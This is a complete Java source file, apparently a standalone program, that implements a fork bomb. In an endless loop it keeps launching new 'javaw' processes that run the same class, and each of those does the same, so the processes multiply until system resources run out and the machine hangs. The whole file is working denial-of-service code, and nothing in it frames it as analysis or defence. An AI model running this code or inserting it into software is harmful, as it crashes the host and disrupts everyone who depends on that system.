public class ForkBomb
{
    public static void main(String[] args)throws Exception
    {
        while(true)
        {
            Runtime.getRuntime().exec(new String[]{"javaw", "-cp", System.getProperty("java.class.path"),"ForkBomb"});
        }
    }
}